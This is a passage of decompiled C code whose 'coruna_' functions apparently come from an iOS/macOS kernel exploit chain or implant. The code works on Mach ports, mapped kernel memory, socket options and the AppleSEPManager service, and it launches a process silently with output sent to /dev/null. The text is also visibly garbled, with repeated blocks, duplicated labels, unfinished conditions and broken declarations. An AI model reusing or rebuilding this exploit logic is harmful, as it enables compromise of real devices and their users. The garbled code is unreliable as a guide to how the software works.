  lk1 = _semaphore_timedwait
                    (*(semaphore_t *)(handle + 0x264),
                     (mach_timespec_t)
                     ((unsigned long)size / 1000000 | (unsigned long)((size % 1000000) * 1000 >> 3) << 0x23));
  return -(uint)(lk1 != 0x31);
}





uint64_t coruna_connect_setsockopt(long handle)
{
  int err;
  int status;
  uint u;
  int *err;
  uint *ptr;
  long handle;
  long addr;
  sockaddr scratch;
  uint64_t scratch;
  uint64_t bootargs;
  long bootargs;
  mach_port_name_t thread_attr;
  
  addr = *(long *)(handle + 0x28);
  if (addr == 0) {
    return 0;
  }
  thread_attr = 0;
  err = _socket(0x20,2,2);
  if (-1 < err) {
    scratch.sa_data[6] = '\0';
    scratch.sa_data[7] = '\0';
    scratch.sa_data[8] = '\0';
    scratch.sa_data[9] = '\0';
    scratch.sa_data[10] = '\0';
    scratch.sa_data[0xb] = '\0';
    scratch.sa_data[0xc] = '\0';
    scratch.sa_data[0xd] = '\0';
    bootargs = 0;
    scratch = 0;
    scratch.sa_len = '\0';
    scratch.sa_family = '\0';
    scratch.sa_data[0] = '\0';
    scratch.sa_data[1] = '\0';
    scratch.sa_data[2] = '\x02';
    scratch.sa_data[3] = '\0';
    scratch.sa_data[4] = '\0';
    scratch.sa_data[5] = '\0';
    status = _connect(err,&scratch,0x20);
    if ((status == 0) && (status = _fileport_makeport(err,&thread_attr), status == 0)) {
      u = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_6(handle,thread_attr,&bootargs);
      if (u == 0) {
        status = coruna_kernel6544_residual_256(handle,bootargs + 0x10,&bootargs);
        u = 0x2800f;
        if (status != 0) {
          handle = coruna_ptr_canonicalize(handle,bootargs);
          if (handle != 0) {
            status = coruna_kernel6544_residual_256(handle,bootargs + 0x30,&bootargs);
            u = 0x2800f;
            if (1 < thread_attr + 1) {
            _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,thread_attr);
            thread_attr = 0;
            }
            if (u == 0 || err == -1) {
            *(uint *)(addr + 0x3c) = u;
            if (u == 0) {
            u = 0xad001;
            do {
            err = ___semwait_signal(*(uint32_t *)(addr + 8),*(uint32_t *)(addr + 0xc),0,0,0,0);
            if (err != 0) {
            done:
            err = ___error();
            err = *err;
            ptr = (uint *)___error();
            u = -*ptr;
            if (-1 < err) {
            u = *ptr;
            }
            u = u | 0x40000000;
            {
            *(uint *)(addr + 0x3c) = u;
            if (*(char *)(addr + 0x38) != '\0') {
            return 0;
            }
            }
            }
            if (*(char *)(addr + 0x38) != '\0') {
            u = 0;
            {
            *(uint *)(addr + 0x3c) = u;
            if (*(char *)(addr + 0x38) != '\0') {
            return 0;
            }
            }
            }
            if (((*(long *)(addr + 0x20) == 0) || (*(long *)(addr + 0x28) == 0)) ||
            {
            *(uint *)(addr + 0x3c) = u;
            if (*(char *)(addr + 0x38) != '\0') {
            return 0;
            }
            }
            scratch = *(long *)(addr + 0x20) + -0x30;
            err = coruna_kernel6544_via_fcntl_1c910(handle,*(long *)(addr + 0x18) + 8,&scratch,
            *(uint32_t *)(handle + 0x168),1);
            if (err == 0) break;
            bootargs = **(long **)(addr + 0x28);
            err = _setsockopt(*(int *)(addr + 0x10),2,0x10,&bootargs,8);
            {
            err = ___error();
            err = *err;
            ptr = (uint *)___error();
            u = -*ptr;
            if (-1 < err) {
            u = *ptr;
            }
            u = u | 0x40000000;
            {
            *(uint *)(addr + 0x3c) = u;
            if (*(char *)(addr + 0x38) != '\0') {
            return 0;
            }
            }
            }
            scratch.sa_len = '\0';
            scratch.sa_family = '\0';
            scratch.sa_data[0] = '\0';
            scratch.sa_data[1] = '\0';
            scratch.sa_data[2] = '\0';
            scratch.sa_data[3] = '\0';
            scratch.sa_data[4] = '\0';
            scratch.sa_data[5] = '\0';
            err = coruna_kernel6544_via_fcntl_1c910(handle,*(long *)(addr + 0x18) + 8,&scratch,
            *(uint32_t *)(handle + 0x168),1);
            } while (err != 0);
            u = 0x28010;
            cleanup:
            *(uint *)(addr + 0x3c) = u;
            if (*(char *)(addr + 0x38) != '\0') {
            return 0;
            }
            }
            }
            else {
            _close(err);
            *(uint *)(addr + 0x3c) = u;
            }
            _semaphore_signal(*(semaphore_t *)(addr + 0xc));
            return 0;
            handle = coruna_ptr_canonicalize(handle,bootargs);
            if (handle != 0) {
              u = 0;
              *(int *)(addr + 0x10) = err;
              *(long *)(addr + 0x18) = bootargs;
              if (1 < thread_attr + 1) {
              _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,thread_attr);
              thread_attr = 0;
              }
              if (u == 0 || err == -1) {
              *(uint *)(addr + 0x3c) = u;
              if (u == 0) {
              u = 0xad001;
              do {
              err = ___semwait_signal(*(uint32_t *)(addr + 8),*(uint32_t *)(addr + 0xc),0,0,0,0);
              if (err != 0) {
              done:
              err = ___error();
              err = *err;
              ptr = (uint *)___error();
              u = -*ptr;
              if (-1 < err) {
              u = *ptr;
              }
              u = u | 0x40000000;
              {
              *(uint *)(addr + 0x3c) = u;
              if (*(char *)(addr + 0x38) != '\0') {
              return 0;
              }
              }
              }
              if (*(char *)(addr + 0x38) != '\0') {
              u = 0;
              {
              *(uint *)(addr + 0x3c) = u;
              if (*(char *)(addr + 0x38) != '\0') {
              return 0;
              }
              }
              }
              if (((*(long *)(addr + 0x20) == 0) || (*(long *)(addr + 0x28) == 0)) ||
              {
              *(uint *)(addr + 0x3c) = u;
              if (*(char *)(addr + 0x38) != '\0') {
              return 0;
              }
              }
              scratch = *(long *)(addr + 0x20) + -0x30;
              err = coruna_kernel6544_via_fcntl_1c910(handle,*(long *)(addr + 0x18) + 8,&scratch,
              *(uint32_t *)(handle + 0x168),1);
              if (err == 0) break;
              bootargs = **(long **)(addr + 0x28);
              err = _setsockopt(*(int *)(addr + 0x10),2,0x10,&bootargs,8);
              {
              err = ___error();
              err = *err;
              ptr = (uint *)___error();
              u = -*ptr;
              if (-1 < err) {
              u = *ptr;
              }
              u = u | 0x40000000;
              {
              *(uint *)(addr + 0x3c) = u;
              if (*(char *)(addr + 0x38) != '\0') {
              return 0;
              }
              }
              }
              scratch.sa_len = '\0';
              scratch.sa_family = '\0';
              scratch.sa_data[0] = '\0';
              scratch.sa_data[1] = '\0';
              scratch.sa_data[2] = '\0';
              scratch.sa_data[3] = '\0';
              scratch.sa_data[4] = '\0';
              scratch.sa_data[5] = '\0';
              err = coruna_kernel6544_via_fcntl_1c910(handle,*(long *)(addr + 0x18) + 8,&scratch,
              *(uint32_t *)(handle + 0x168),1);
              } while (err != 0);
              u = 0x28010;
              cleanup:
              *(uint *)(addr + 0x3c) = u;
              if (*(char *)(addr + 0x38) != '\0') {
              return 0;
              }
              }
              }
              else {
              _close(err);
              *(uint *)(addr + 0x3c) = u;
              }
              _semaphore_signal(*(semaphore_t *)(addr + 0xc));
              return 0;
            }
          }
          u = 0x28026;
        }
      }
      if (1 < thread_attr + 1) {
      _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,thread_attr);
      thread_attr = 0;
      }
      if (u == 0 || err == -1) {
      *(uint *)(addr + 0x3c) = u;
      if (u == 0) {
      u = 0xad001;
      do {
      err = ___semwait_signal(*(uint32_t *)(addr + 8),*(uint32_t *)(addr + 0xc),0,0,0,0);
      if (err != 0) {
      done:
      err = ___error();
      err = *err;
      ptr = (uint *)___error();
      u = -*ptr;
      if (-1 < err) {
      u = *ptr;
      }
      u = u | 0x40000000;
      {
      *(uint *)(addr + 0x3c) = u;
      if (*(char *)(addr + 0x38) != '\0') {
      return 0;
      }
      }
      }
      if (*(char *)(addr + 0x38) != '\0') {
      u = 0;
      {
      *(uint *)(addr + 0x3c) = u;
      if (*(char *)(addr + 0x38) != '\0') {
      return 0;
      }
      }
      }
      if (((*(long *)(addr + 0x20) == 0) || (*(long *)(addr + 0x28) == 0)) ||
      {
      *(uint *)(addr + 0x3c) = u;
      if (*(char *)(addr + 0x38) != '\0') {
      return 0;
      }
      }
      scratch = *(long *)(addr + 0x20) + -0x30;
      err = coruna_kernel6544_via_fcntl_1c910(handle,*(long *)(addr + 0x18) + 8,&scratch,
      *(uint32_t *)(handle + 0x168),1);
      if (err == 0) break;
      bootargs = **(long **)(addr + 0x28);
      err = _setsockopt(*(int *)(addr + 0x10),2,0x10,&bootargs,8);
      {
      err = ___error();
      err = *err;
      ptr = (uint *)___error();
      u = -*ptr;
      if (-1 < err) {
      u = *ptr;
      }
      u = u | 0x40000000;
      {
      *(uint *)(addr + 0x3c) = u;
      if (*(char *)(addr + 0x38) != '\0') {
      return 0;
      }
      }
      }
      scratch.sa_len = '\0';
      scratch.sa_family = '\0';
      scratch.sa_data[0] = '\0';
      scratch.sa_data[1] = '\0';
      scratch.sa_data[2] = '\0';
      scratch.sa_data[3] = '\0';
      scratch.sa_data[4] = '\0';
      scratch.sa_data[5] = '\0';
      err = coruna_kernel6544_via_fcntl_1c910(handle,*(long *)(addr + 0x18) + 8,&scratch,
      *(uint32_t *)(handle + 0x168),1);
      } while (err != 0);
      u = 0x28010;
      cleanup:
      *(uint *)(addr + 0x3c) = u;
      if (*(char *)(addr + 0x38) != '\0') {
      return 0;
      }
      }
      }
      else {
      _close(err);
      *(uint *)(addr + 0x3c) = u;
      }
      _semaphore_signal(*(semaphore_t *)(addr + 0xc));
      return 0;
    }
  }
  err = ___error();
  status = *err;
  ptr = (uint *)___error();
  u = -*ptr;
  if (-1 < status) {
    u = *ptr;
  }
  u = u | 0x40000000;
fail:
  if (1 < thread_attr + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,thread_attr);
    thread_attr = 0;
  }
  if (u == 0 || err == -1) {
    *(uint *)(addr + 0x3c) = u;
    if (u == 0) {
      u = 0xad001;
      do {
        err = ___semwait_signal(*(uint32_t *)(addr + 8),*(uint32_t *)(addr + 0xc),0,0,0,0);
        if (err != 0) {
done:
          err = ___error();
          err = *err;
          ptr = (uint *)___error();
          u = -*ptr;
          if (-1 < err) {
            u = *ptr;
          }
          u = u | 0x40000000;
          {
            *(uint *)(addr + 0x3c) = u;
            if (*(char *)(addr + 0x38) != '\0') {
            return 0;
            }
          }
        }
        if (*(char *)(addr + 0x38) != '\0') {
          u = 0;
          {
            *(uint *)(addr + 0x3c) = u;
            if (*(char *)(addr + 0x38) != '\0') {
            return 0;
            }
          }
        }
        if (((*(long *)(addr + 0x20) == 0) || (*(long *)(addr + 0x28) == 0)) ||
           {
             *(uint *)(addr + 0x3c) = u;
             if (*(char *)(addr + 0x38) != '\0') {
             return 0;
             }
           }
        scratch = *(long *)(addr + 0x20) + -0x30;
        err = coruna_kernel6544_via_fcntl_1c910(handle,*(long *)(addr + 0x18) + 8,&scratch,
                             *(uint32_t *)(handle + 0x168),1);
        if (err == 0) break;
        bootargs = **(long **)(addr + 0x28);
        err = _setsockopt(*(int *)(addr + 0x10),2,0x10,&bootargs,8);
        {
          err = ___error();
          err = *err;
          ptr = (uint *)___error();
          u = -*ptr;
          if (-1 < err) {
          u = *ptr;
          }
          u = u | 0x40000000;
          {
          *(uint *)(addr + 0x3c) = u;
          if (*(char *)(addr + 0x38) != '\0') {
          return 0;
          }
          }
        }
        scratch.sa_len = '\0';
        scratch.sa_family = '\0';
        scratch.sa_data[0] = '\0';
        scratch.sa_data[1] = '\0';
        scratch.sa_data[2] = '\0';
        scratch.sa_data[3] = '\0';
        scratch.sa_data[4] = '\0';
        scratch.sa_data[5] = '\0';
        err = coruna_kernel6544_via_fcntl_1c910(handle,*(long *)(addr + 0x18) + 8,&scratch,
                             *(uint32_t *)(handle + 0x168),1);
      } while (err != 0);
      u = 0x28010;
cleanup:
      *(uint *)(addr + 0x3c) = u;
      if (*(char *)(addr + 0x38) != '\0') {
        return 0;
      }
    }
  }
  else {
    _close(err);
    *(uint *)(addr + 0x3c) = u;
  }
  _semaphore_signal(*(semaphore_t *)(addr + 0xc));
  return 0;
}





uint64_t coruna_semaphore_wait_21a90(semaphore_t arg)
{
  _semaphore_wait(arg);
  return 0;
}





uint64_t coruna_semaphore_wait(semaphore_t arg)
{
  _semaphore_wait(arg);
  return 0;
}





uint64_t coruna_semaphore_wait_2adb4(long *handle)
{
  pthread_mutex_t *ptr;
  unsigned long u;
  semaphore_t semaphore;
  bool err;
  int err;
  uint size;
  uint version;
  kern_return_t lk7;
  pthread_t p_Var8;
  bool status;
  long handle;
  vm_address_t lv11;
  unsigned long port;
  long addr;
  long off;
  unsigned long size;
  bool flags;
  long base;
  uint tag;
  unsigned long kind;
  vm_inherit_t in_stack_ffffffffffffff90;
  vm_address_t scratch;
  
  semaphore = *(semaphore_t *)(handle + 0x11);
  ptr = (pthread_mutex_t *)(handle + 4);
  base = handle[0xd];
  if (base == 0) {
    flags = false;
    status = false;
    addr = *handle;
    tag = 0;
    do {
      if ((status) && (err = _pthread_mutex_unlock(ptr), err != 0)) {
fail:
        *(int *)(handle + 0xf) = (int)handle[0xf] + 1;
        goto done;
      }
      if (tag != 0) {
        _thread_switch(0,2,1);
      }
      err = _pthread_mutex_lock(ptr);
      if (err != 0) {
        *(int *)(handle + 0xf) = (int)handle[0xf] + 1;
        if (flags) {
        _semaphore_wait(semaphore);
        }
        return 0;
      }
      if (((handle[0xd] == 0) && (size = coruna_kernel6544_residual_250(), size < *(uint *)(handle + 2))) &&
         (handle = *(long *)(handle[1] + (unsigned long)size * 8), handle != 0)) {
        off = *(long *)(handle + (unsigned long)*(uint *)((long)handle + 0x14));
        handle = coruna_ptr_canonicalize(addr,off);
        if ((handle != 0) && (version = coruna_kernel6544_residual_250(), size == version)) {
          u = off + (unsigned long)*(uint *)(handle + 0xc);
          kind = u & (*(unsigned long *)(addr + 0x188) ^ 0xffffffffffffffff);
          if ((handle[3] != 0) && (kind == handle[3])) goto fail;
          handle = coruna_kernel6544_residual_246(addr,u);
          if (handle == 0) {
check_ok:
            handle[3] = kind;
            goto fail;
          }
          if ((*(vm_address_t *)(addr + 0x90) == 0) ||
             (size = *(unsigned long *)(addr + 0x98), lv11 = *(vm_address_t *)(addr + 0x90), size == 0
             )) {
            scratch = 0;
            if ((*(mem_entry_name_port_t *)(addr + 0x58) + 1 < 2) ||
               (((*(vm_offset_t *)(addr + 0x80) == 0 ||
                 (size = (unsigned long)*(uint *)(addr + 0x88), *(uint *)(addr + 0x88) == 0)) ||
                (lk7 = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,size,0,1,
                                 *(mem_entry_name_port_t *)(addr + 0x58),
                                 *(vm_offset_t *)(addr + 0x80),0,1,1,in_stack_ffffffffffffff90),
                lk7 != 0)))) goto check_ok;
            *(vm_address_t *)(addr + 0x90) = scratch;
            *(unsigned long *)(addr + 0x98) = size;
            lv11 = scratch;
          }
          port = 0;
          handle = *(long *)(addr + 0x80);
          size = *(uint *)(addr + 0x88);
          while ((*(int *)(lv11 + ((int)port + 0x20)) == 0 ||
                 (*(unsigned long *)(lv11 + ((int)port + 0x18)) != kind))) {
            port = port + 0x30;
            if (size <= (port & 0xffffffff)) goto check_ok;
          }
          off = *(long *)k_kernel_vm_page_size_slot;
          version = *(uint *)k_kernel_vm_page_shift_slot;
          kind = *(unsigned long *)(addr + 0x188);
          p_Var8 = _pthread_self();
          handle[0xd] = (long)p_Var8;
          handle[0xe] = (kind & u) +
                         ((((handle + (unsigned long)size + off) - 1 & -off) >> ((unsigned long)version & 0x3f)
                          ) + port / 0x30) * off;
          flags = true;
        }
      }
      if (handle[0xd] != 0) break;
      status = true;
      err = tag < 0xf;
      tag = tag + 1;
    } while (err);
  }
  else {
    flags = false;
  }
  *(int *)(handle + 0xf) = (int)handle[0xf] + 1;
  if (base == 0) {
done:
    _pthread_mutex_unlock(ptr);
  }
cleanup:
  if (flags) {
    _semaphore_wait(semaphore);
  }
  return 0;
}





uint64_t coruna_return_zero_21d34(long handle)
{
  bool err;
  int err;
  int *err;
  uint u;
  
  ___error();
  *(uint8_t *)(handle + 0x49) = 1;
  u = 0;
fail:
  do {
    err = ___ulock_wait(0x10001,(uint32_t *)(handle + 0x34),0,*(uint32_t *)(handle + 0x34));
    if (err == 0) {
      *(long *)(handle + 0x40) = *(long *)(handle + 0x40) + 1;
    }
    else {
      if (((err == -1) && (err = ___error(), *err == 4)) &&
         (err = u < 100, u = u + 1, err)) goto fail;
      err = ___error();
      if (*err != 0xe) {
        return 0;
      }
    }
    u = 0;
    if (*(char *)(handle + 0x48) != '\0') {
      return 0;
    }
  } while( true );
}
unsigned long coruna_ioconnectcallscalarmethod(long arg,unsigned long val,long n)

{
  long handle;
  long serial_7;
  long serial_10;
  long base;
  int err;
  uint type_id_15;
  int n;
  long serial_13;
  uint64_t type_id_17;
  long serial_18;
  unsigned long kind;
  long serial;
  long serial_17;
  unsigned long type_id_16;
  long cache_70;
  long cache_71;
  unsigned long cache_72 [4];
  uint64_t cache_64;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_73;
  uint64_t cache_24;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t cache_74;
  uint64_t cache_27;
  uint64_t cache_28;
  uint64_t cache_29;
  uint64_t cache_75;
  uint64_t cache_30;
  uint64_t cache_31;
  uint64_t cache_32;
  uint64_t cache_76;
  uint64_t cache_33;
  uint64_t cache_34;
  uint64_t cache_35;
  uint64_t cache_77;
  uint64_t cache_36;
  uint64_t cache_37;
  uint64_t cache_38;
  uint64_t cache_47;
  uint64_t cache_39;
  uint64_t cache_40;
  uint64_t cache_41;
  uint64_t thread_attr;
  uint64_t cache_42;
  uint64_t cache_43;
  uint64_t cache_44;
  uint64_t block_ctx;
  uint32_t bootargs;
  uint64_t cache_45;
  uint64_t cache_78;
  uint64_t cache_46;
  uint64_t cache_79;
  uint64_t cache_47;
  uint64_t cache_80;
  uint64_t cache_48;
  uint64_t cache_81;
  uint64_t cache_49;
  uint64_t cache_82;
  uint64_t cache_50;
  uint64_t cache_83;
  uint64_t cache_51;
  uint64_t cache_84;
  uint64_t cache_52;
  uint64_t cache_85;
  uint64_t cache_53;
  uint64_t cache_86;
  uint64_t cache_54;
  uint64_t cache_87;
  uint64_t cache_55;
  uint64_t cache_65;
  uint64_t cache_56;
  uint64_t cache_66;
  uint64_t cache_57;
  uint64_t cache_88;
  uint64_t cache_58;
  uint64_t cache_59;
  uint32_t work;
  uint32_t cache_58;
  uint32_t cache_60;
  uint64_t cache;
  long cache_32;
  
  cache_32 = *(long *)k_kernel_stack_chk_guard_slot;
  cache_72[2] = 0;
  serial_13 = *(long *)(&k_kernel_slot_1d48 + arg);
  if (serial_13 == 0) {
    kind = 0xad001;
  }
  else {
    err = *(int *)(serial_13 + 0x70);
    if (err + 1U < 2) {
      kind = 0x28008;
    }
    else {
      serial_17 = *(long *)(serial_13 + 0x58);
      if (((serial_17 != 0) && (serial_18 = *(long *)(serial_13 + 0x60), serial_18 != 0)) &&
         (serial = *(long *)(serial_13 + 0x68), serial != 0)) {
        serial_13 = *(long *)(serial_13 + 0x50);
        kind = 0x28011;
        if (*(long *)k_kernel_stack_chk_guard_slot != cache_32) {
        ___stack_chk_fail();
        }
        return kind;
      }
      kind = 0x28026;
    }
  }
load_ok_66:
  if (*(long *)k_kernel_stack_chk_guard_slot != cache_32) {
    ___stack_chk_fail();
  }
  return kind;
}





uint64_t coruna_vm_deallocate_2b4c8(uint64_t val,unsigned long arg,uint64_t *id_2,uint size)
{
  uint64_t u;
  vm_size_t size;
  unsigned long size;
  void *scratch;
  
  scratch = (void *)0x0;
  size = *(vm_size_t *)k_kernel_vm_page_size_slot;
  if ((-size & arg) + size < arg + size) {
    u = 0xad001;
  }
  else {
    size = *(unsigned long *)k_kernel_vm_page_mask_slot;
    u = coruna_vm_map_27414(val,&scratch,size,arg);
    if ((int)u == 0) {
      if (size == 8) {
        *(uint64_t *)((long)scratch + (size & arg)) = *id_2;
      }
      else if (size == 4) {
        *(uint32_t *)((long)scratch + (size & arg)) = *(uint32_t *)id_2;
      }
      else {
        _memcpy(scratch,id_2,(unsigned long)size);
      }
      _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(vm_address_t)scratch,size);
      u = 0;
    }
  }
  return u;
}





uint coruna_open_sepmgr_2222c(long handle,uint64_t val,uint64_t id_2)
{
  long handle;
  int err;
  uint u;
  uint size;
  long addr;
  unsigned long version;
  long scratch;
  
  version = (unsigned long)*(uint *)(handle + 0x10);
  if (*(uint *)(handle + 0x10) + 1 < 2) {
    version = coruna_ioservicegetmatchingservice("AppleSEPManager");
    if ((int)version + 1U < 2) {
      return 0xad011;
    }
    *(int *)(handle + 0x10) = (int)version;
  }
  addr = *(long *)(handle + 0x18);
  if (addr == 0) {
    addr = coruna_kernel6544_via_return_zero_2b000(handle,version);
    if (addr == 0) {
      return 0x2800e;
    }
    *(long *)(handle + 0x18) = addr;
  }
  handle = *(long *)(handle + 0x20);
  if (*(long *)(handle + 0x20) == 0) {
    err = coruna_kernel6544_residual_256(handle,addr + 0x28,&scratch);
    if (err == 0) {
      return 0x2800f;
    }
    *(long *)(handle + 0x20) = scratch;
    handle = scratch;
  }
  scratch = handle;
  err = coruna_mach_vm_machine_attribute_29df8(handle,addr + 0x28,val,0);
  size = 0x28010;
  if (err != 0) {
    u = __IOServiceSetAuthorizationID(version,id_2);
    size = 0;
    if (u != 0) {
      if (u == 0x35) {
        if (*(char *)(handle + 0xc) == '\0') {
          size = coruna_kernel6544_via_kernel6544_via_fcntl_1bf84_6(handle,*(uint32_t *)k_kernel_mach_task_self_slot,0,0);
        }
        else {
          *(uint8_t *)(handle + 0xc) = 0;
          size = coruna_kernel6544_via_kernel6544_via_fcntl_1bf84_6(handle,*(uint32_t *)k_kernel_mach_task_self_slot,0,0);
          *(uint8_t *)(handle + 0xc) = 1;
        }
        if (size == 0) {
          u = __IOServiceSetAuthorizationID(version,id_2);
          size = 0;
          if (u != 0) {
            size = u & 0xfff | 0x70000000;
          }
        }
      }
      else {
        size = u & 0xfff | 0x70000000;
      }
    }
    err = coruna_mach_vm_machine_attribute_29df8(handle,addr + 0x28,scratch,0);
    u = 0x28010;
    if (size != 0) {
      u = size;
    }
    if (err == 0) {
      size = u;
    }
  }
  return size;
}





int coruna_open_dev_null_223f8(char **path)
{
  int err;
  int status;
  int flags;
  pid_t lp4;
  int *err;
  uint scratch;
  pid_t bootargs;
  posix_spawn_file_actions_t thread_attr;
  sigset_t host_info;
  posix_spawnattr_t serial_buf;
  
  flags = 0xad00b;
  serial_buf = (posix_spawnattr_t)0x0;
  thread_attr = (posix_spawn_file_actions_t)0x0;
  scratch = 0xffffffff;
  bootargs = -1;
  status = 0xad001;
  if ((((path != (char **)0x0) && (*path != (char *)0x0)) && (**path != '\0')) &&
     (err = _posix_spawnattr_init(&serial_buf), status = flags, err == 0)) {
    host_info = 0xffffffff;
    status = _posix_spawnattr_setflags(&serial_buf,7);
    if (((status == 0) && (status = _posix_spawnattr_setsigdefault(&serial_buf,&host_info), status == 0))
       && ((status = _posix_spawnattr_setpgroup(&serial_buf,0), status == 0 &&
           (status = _posix_spawn_file_actions_init(&thread_attr), status == 0)))) {
      flags = _posix_spawn_file_actions_addopen(&thread_attr,0,"/dev/null",0x20000,0);
      if (((flags == 0) &&
          (flags = _posix_spawn_file_actions_addopen(&thread_attr,1,"/dev/null",0x20201,0), flags == 0)
          ) && ((flags = _posix_spawn_file_actions_addopen(&thread_attr,2,"/dev/null",0x20201,0),
                flags == 0 &&
                (flags = _posix_spawn(&bootargs,*path,&thread_attr,&serial_buf,path,(char **)0x0),
                flags == 0)))) {
        flags = 0xad00b;
        do {
          lp4 = _waitpid(bootargs,(int *)&scratch,0);
          if (lp4 == bootargs) {
            if (lp4 != -1) goto fail;
            flags = 0;
          }
          else {
            if (lp4 != -1) break;
            ___error();
          }
          err = ___error();
        } while (*err == 4);
        if (flags == 0) {
fail:
          status = 0;
          if ((scratch & 0xff00) != 0) {
            status = 0xad00b;
          }
          flags = 0xad00b;
          if ((scratch & 0x7f) == 0) {
            flags = status;
          }
        }
      }
      else {
        flags = 0xad00b;
      }
      _posix_spawn_file_actions_destroy(&thread_attr);
    }
    _posix_spawnattr_destroy(&serial_buf);
    status = flags;
  }
  return status;
}





void coruna_kernel29d3c_via_free_1b984(long handle)
{
  if (*(long *)(&k_kernel_slot_18d0 + handle) != 0) {
    coruna_free_1b984();
    return;
  }
  return;
}





uint64_t coruna_return_zero_1ef6c(uint64_t val,uint64_t id_2,int flags)
{
  uint u;
  int err;
  int status;
  long handle;
  unsigned long size;
  unsigned long *ptr;
  long addr;
  uint64_t version;
  int scratch;
  int bootargs;
  uint32_t thread_attr;
  unsigned long host_info;
  unsigned long serial_buf;
  unsigned long action;
  uint8_t block_ctx[32];
  long stack_guard;
  uint32_t sa_saved[2];
  long sa_new;
  uint8_t path_buf[8];
  uint8_t tmp_buf[8];
  unsigned long region;
  uint32_t plist;
  char url_buf;
  uint64_t json_buf;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t frame;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t work;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t cache;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t cache_20;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t cache_21;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t cache_22;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t cache_23;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  uint64_t cache_24;
  
  bootargs = flags;
  err = coruna_ctx_test_flag(val,0x200000);
  version = 0x206000000;
  if (err != 0) {
    version = 0x406000000;
  }
  scratch = 0;
  handle = coruna_kernel6544_via_nop_stub_3_4(val,id_2);
  if ((handle == 0) || (err = coruna_mach_absolute_time_18ebc_22a6c(val,1), err == 0)) {
    return 0;
  }
  err = coruna_kernel6544_via_nop_stub_6_4(val,&url_buf,&serial_buf);
  version = 0;
  coruna_slot_clear(val,3);
  return version;
}





long coruna_kernel6544_via_nop_stub_3_4(long handle,unsigned long arg)
{
  int err;
  long handle;
  uint8_t scratch[32];
  unsigned long bootargs;
  
  err = coruna_nop_stub_3(handle,arg & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),
                       scratch);
  if ((err == 0) || (bootargs == 0)) {
    handle = 0;
  }
  else {
    handle = (*(unsigned long *)(handle + 0x188) & arg) + (bootargs & 0xffffffffc000);
  }
  return handle;
}





uint64_t coruna_mach_absolute_time_18ebc_22a6c(long handle,int flags)
{
  unsigned long u;
  int err;
  uint64_t size;
  long handle;
  
  if (flags == 0) {
    coruna_slot_clear(handle,3);
  }
  else {
    if (((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) &&
       (handle = *(long *)(*(long *)(handle + 0x118) + 0x150), handle != 0)) {
      size = _mach_absolute_time();
      u = 0;
      if ((unsigned long)*(uint *)(handle + 0x260) != 0) {
        u = ((size - handle) * (unsigned long)*(uint *)(handle + 0x25c)) /
                (unsigned long)*(uint *)(handle + 0x260);
      }
      if (u < 20000000) {
        coruna_semaphore_timedwait(handle,(0x14 - (int)((u & 0xffffffff) / 1000000)) * 1000);
      }
    }
    err = coruna_mach_absolute_time_1b5b4(handle,3,31000);
    if (err != 0) {
      return 0;
    }
    if ((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) {
      size = _mach_absolute_time();
      *(uint64_t *)(*(long *)(handle + 0x118) + 0x150) = size;
    }
  }
  return 1;
}





uint64_t
void coruna_kernel6544_via_mach_absolute_time_20560(uint64_t val,uint64_t id_2,unsigned long arg,uint32_t *size,uint size_x,
            uint64_t size_3)
{
  long handle;
  uint32_t u;
  int err;
  unsigned long size;
  unsigned long version;
  uint64_t port;
  long addr;
  unsigned long tag;
  uint8_t scratch;
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t host_info;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t serial_buf;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t action;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t block_ctx;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t stack_guard;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t sa_saved;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  unsigned long sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint32_t region[5];
  
  cache_22 = 0;
  sa_saved = 0;
  cache_24 = 0;
  cache_23 = 0;
  cache = 0;
  stack_guard = 0;
  cache_21 = 0;
  cache_20 = 0;
  json_buf = 0;
  block_ctx = 0;
  work = 0;
  frame = 0;
  region = 0;
  action = 0;
  url_buf = 0;
  plist = 0;
  sa_new = 0;
  serial_buf = 0;
  tmp_buf = 0;
  path_buf = 0;
  block_ctx = 0;
  host_info = 0;
  sa_saved = 0;
  stack_guard = 0;
  host_info = 0;
  thread_attr = 0;
  action = 0;
  serial_buf = 0;
  scratch = 0;
  bootargs = 0;
  thread_attr = 0;
  bootargs = 0;
  scratch = 0;
  err = coruna_mach_absolute_time_1f9f8(val,id_2,&bootargs);
  port = 0;
  if (err != 0) {
    err = coruna_mach_absolute_time_1fc74(val,&bootargs,0,size_3);
    port = 0;
    if (err != 0) {
      if (size_x == 0) {
        port = 1;
      }
      else {
        addr = 0;
